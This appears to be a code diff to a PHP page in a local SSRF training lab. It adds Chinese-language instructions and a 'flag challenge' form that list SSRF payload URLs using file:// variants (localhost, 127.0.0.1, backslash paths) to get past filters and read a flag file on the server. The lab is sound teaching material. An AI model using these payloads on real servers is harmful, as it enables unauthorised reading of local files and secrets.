@@ -143,7 +143,22 @@ $content = '<div class="card">
                         </ul>
                     </ol>
 
-                    <h5 class="mb-2 mt-4">4. 其他绕过方法</h5>
+                    <h5 class="mb-2 mt-4">4. 读取Flag文件</h5>
+                    <ol>
+                        <li>尝试读取服务器上的flag文件：</li>
+                        <ul>
+                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file:///d:/phpstudy_pro/WWW/zhaosec/ssrf/flag.txt</code> - 直接访问（可能被拦截）</li>
+                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file://localhost/d:/phpstudy_pro/WWW/zhaosec/ssrf/flag.txt</code> - 使用localhost</li>
+                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file://127.0.0.1/d:/phpstudy_pro/WWW/zhaosec/ssrf/flag.txt</code> - 使用127.0.0.1</li>
+                        </ul>
+                        <li>使用不同的文件路径格式：</li>
+                        <ul>
+                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file:///d:\phpstudy_pro\WWW\zhaosec\ssrf\flag.txt</code> - 使用反斜杠</li>
+                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file://d:/phpstudy_pro/WWW/zhaosec/ssrf/flag.txt</code> - 省略三个斜杠</li>
+                        </ul>
+                    </ol>
+
+                    <h5 class="mb-2 mt-4">5. 其他绕过方法</h5>
                     <ol>
                         <li>使用DNS重绑定：</li>
                         <ul>
@@ -173,6 +188,23 @@ $content = '<div class="card">
                             <button type="submit" class="btn btn-danger">测试</button>
                         </div>
                     </form>
+                    
+                    <div class="card mt-4">
+                        <div class="card-header">
+                            <h6>🎯 Flag挑战</h6>
+                        </div>
+                        <div class="card-body">
+                            <p class="mb-3">尝试读取服务器上的flag文件：</p>
+                            <form method="GET" class="mb-3">
+                                <div class="input-group">
+                                    <span class="input-group-text">Flag路径</span>
+                                    <input type="text" name="bypass" class="form-control" value="file:///d:/phpstudy_pro/WWW/zhaosec/ssrf/flag.txt">
+                                    <button type="submit" class="btn btn-success">读取Flag</button>
+                                </div>
+                            </form>
+                            <p class="text-muted">提示：尝试使用不同的文件路径格式和绕过方法来读取flag文件</p>
+                        </div>
+                    </div>
 
                     ';
 
